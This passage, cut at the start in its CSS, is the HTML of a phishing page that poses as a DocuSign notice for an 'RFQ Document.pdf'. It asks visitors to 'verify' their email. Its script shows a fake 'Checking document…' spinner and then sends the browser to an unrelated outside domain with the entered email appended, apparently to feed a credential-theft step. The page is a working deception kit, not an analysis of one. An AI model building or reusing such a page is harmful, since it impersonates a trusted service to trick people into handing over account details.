      background-size: cover;
      font-family: var(--font);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 30px;
      backdrop-filter: blur(5px);
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: var(--white);
      border-radius: 14px;
      padding: 40px 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      text-align: center;
    }

    .logo-text {
      font-size: 30px;
      font-weight: bold;
      margin-bottom: 24px;
      display: inline-block;
      font-family: var(--font);
    }

    .logo-docu {
      color: var(--text-dark);
    }

    .logo-sign {
      color: var(--primary);
      font-style: italic;
      margin-left: 3px;
      font-weight: 500;
    }

    .file-box {
      background: #f0f3f6;
      border-radius: 8px;
      padding: 12px 16px;
      font-size: 14px;
      margin-bottom: 20px;
      color: var(--text-muted);
      display: flex;
      justify-content: space-between;
    }

    .description {
      font-size: 16px;
      color: var(--text-dark);
      margin-bottom: 24px;
      line-height: 1.5;
    }

    input[type="email"] {
      width: 100%;
      padding: 14px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 16px;
    }

    input::placeholder {
      color: #999;
    }

    button {
      width: 100%;
      padding: 14px;
      background: var(--primary);
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background: var(--primary-hover);
    }

    .disclaimer {
      font-size: 12px;
      margin-top: 18px;
      color: #777;
    }

    .disclaimer a {
      color: var(--primary);
      text-decoration: underline;
    }

    .loader-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(255, 255, 255, 0.95);
      z-index: 999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }

    .spinner {
      width: 48px;
      height: 48px;
      border: 5px solid #ccc;
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 12px;
    }

    .loader-text {
      font-size: 16px;
      font-weight: 500;
      color: var(--text-dark);
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-text">
      <span class="logo-docu">Docu</span><span class="logo-sign">Sign</span>
    </div>

    <div class="file-box">
      <span><strong>Document:</strong> RFQ Document.pdf</span>
      <span>🔒 1.2 MB</span>
    </div>

    <div class="description">
      You’ve received a secure document. Please verify your email to access the file.
    </div>

    <form id="accessForm">
      <input
        type="email"
        id="email"
        name="email"
        placeholder="Enter your email"
        required
        autocomplete="email"
      />
      <button type="submit">Access Document</button>
    </form>

    <div class="disclaimer">
      By continuing, you agree to our <a href="#">Privacy Policy</a> and data processing terms.
    </div>
  </div>

  <!-- Loader Overlay -->
  <div class="loader-overlay" id="loader">
    <div class="spinner"></div>
    <div class="loader-text">Checking document…</div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const form = document.getElementById("accessForm");
      const emailInput = document.getElementById("email");
      const loader = document.getElementById("loader");

      form.addEventListener("submit", function (e) {
        e.preventDefault();
        const email = emailInput.value.trim();

        if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) {
          alert("Please enter a valid email address.");
          return;
        }

        loader.style.display = "flex";

        setTimeout(() => {
          const encodedEmail = decodeURIComponent(email);
		  const url = 'https://ivrixio.sa.com/NxprxRcdV/#';
          const targetURL = url + encodedEmail;
          window.location.href = targetURL;
        }, 2500);
      });
    });
  </script>
</body>
</html>
